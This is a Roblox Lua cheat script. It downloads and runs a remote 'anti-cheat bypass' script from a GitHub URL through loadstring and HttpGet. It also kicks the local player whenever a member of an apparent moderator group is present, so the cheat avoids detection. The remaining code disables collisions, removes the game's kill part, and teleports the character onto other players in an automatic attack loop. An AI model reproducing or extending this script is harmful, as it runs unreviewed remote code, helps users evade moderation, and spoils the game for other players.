task.spawn(function()
spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pstrw/WhispHub/main/ACB1.lua"))();
end)
spawn(function()
getgenv().CoolCheck = false
local groupId = 7548958

local folder = Instance.new("Folder")
folder.Name = "ABC"
folder.Parent = game.Workspace
local part = Instance.new("Part")
part.Name = "ABCPart"
part.Parent = folder
part.Anchored = true
part.CanCollide = true
part.CastShadow = false
part.Transparency = 1
part.Size = Vector3.new(2048, 50, 2048)
part.CFrame = CFrame.new(Vector3.new(-0.5, 38, -0.5))


getgenv().CoolCheck = true

while getgenv().CoolCheck == true do
    wait()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player:IsInGroup(groupId) then
            game.Players.LocalPlayer:Kick(player.Name .. " is a mod or smth")
        end
    end
end
end)
end)

local a = game.Workspace.Structure
local b = a:GetDescendants()

for _, c in ipairs(b) do
    if c:IsA("BasePart") and (c.Name == "Deco" or c.Name == "Part") then
        c.CanCollide = false
    end
end

local d = game:GetService("Players")
local e = game:GetService("Workspace")
local f = game:GetService("Lighting")
local g = game:GetService("RunService")

local h = d.LocalPlayer
local i = h.Character or h.CharacterAdded:Wait()
local j = i:WaitForChild("Humanoid")
local k = i:WaitForChild("HumanoidRootPart")

local l = nil
j:UnequipTools()

local m = e.Structure.Baseplate
m.CanCollide = false

local n = Instance.new("Part")
n.Anchored = true
n.Parent = e
n.Size = Vector3.new(2400, m.Size.Y, 2400)
n.CanCollide = true
n.CFrame = m.CFrame * CFrame.new(0, -3, 0)
n.Transparency = 1

k.CFrame = k.CFrame * CFrame.new(0, -3, 0)

local o = e.Structure.KillPart:FindFirstChild("KillPart")

if o then
    o.Parent = f
end

task.spawn(function()
    l = g.Stepped:Connect(function()
        if i and j and j.Health > 0 then
            for _, p in pairs(i:GetChildren()) do
                if p:IsA("BasePart") and p.CanCollide == true and p.Name == "Head" then
                    p.CanCollide = false
                end
            end
        end
    end)
end)

local q = game:GetService("RunService")
local r = game:GetService("TweenService")
local s = game:GetService("Workspace")
local t = game:GetService("Players")
local u = t.LocalPlayer

local v = s.Structure
local w = v.SpawnLocation

getgenv().x = true

q.RenderStepped:Connect(function()
    pcall(function()
        if getgenv().x then
            for _, y in next, t:GetPlayers() do
                if y ~= u then
                    if y.Character.Humanoid.Health > 0 then
                        if (y.Character.HumanoidRootPart.Position - w.Position).Magnitude > 45 then
                            if (y.Character.HumanoidRootPart.Position - u.Character.HumanoidRootPart.Position).Magnitude < math.huge then
                                if u.Backpack:FindFirstChildOfClass("Tool") and u.Character:FindFirstChildOfClass("Tool") == nil then
                                    u.Character.Humanoid:EquipTool(u.Backpack:FindFirstChildOfClass("Tool"))
                                end
                                u.Character:FindFirstChildOfClass("Tool"):Activate()

                                local z = (u.Character.HumanoidRootPart.Position - y.Character.HumanoidRootPart.Position).Magnitude
                                local A = z / tonumber(45)

                                local B = r:Create(u.Character.HumanoidRootPart, TweenInfo.new(A, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {CFrame = y.Character.HumanoidRootPart.CFrame * CFrame.new(-1.4, 0.5, 3.4)})

                                B:Play()
                                wait()
                                B.Completed:Wait()
                            end
                        end
                    end
                end
            end
        end
    end)
end)
